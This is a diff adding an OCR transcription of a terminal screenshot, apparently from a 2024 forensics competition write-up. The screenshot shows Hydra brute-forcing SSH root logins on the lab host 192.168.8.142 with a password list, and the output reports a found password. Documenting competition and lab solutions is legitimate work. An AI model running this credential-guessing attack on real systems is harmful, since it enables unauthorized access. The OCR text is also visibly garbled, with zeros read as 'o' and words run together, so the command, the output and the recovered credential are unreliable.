@@ -1,0 +1,15 @@
+# OCR: ece37bd1d4d135c0b456491f22145331.jpg
+# 来源: ./02-WriteUp/2024/2024-FIC-初赛/ece37bd1d4d135c0b456491f22145331.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:10
+
+reotekai-【~/桌面
+#hydra-1root-PcommonPwd.txt.ssh://192.168.8.142
+Hydra v9.5 (c) 2o23 by van Hauser/THc & David Maciejak Please do not use in military o ndethicsanyway).
+Hydra(https://github.com/vanhauser-thc/thc-hydra)starting at 2o24-o4-272o:51:14
+[wARNING] Many ssH configurations limit the number of parallel tasks,it is recommended[DATA]max 16 tasksper 1 server,overall 16 tasks,147logintries(l:1/p:147),~1o tri[DATA]attackingssh://192.168.8.142:22]
+login:rootpassword：hl@7eel
+[221Tsshlhost:192168.8142
+1of1 targetsuccessfullycompleted,lvalid passwordfound
+Hydra (https://github.com/vanhauser-thc/thc-hydra)finished at2o24-o4-272o:5l:19
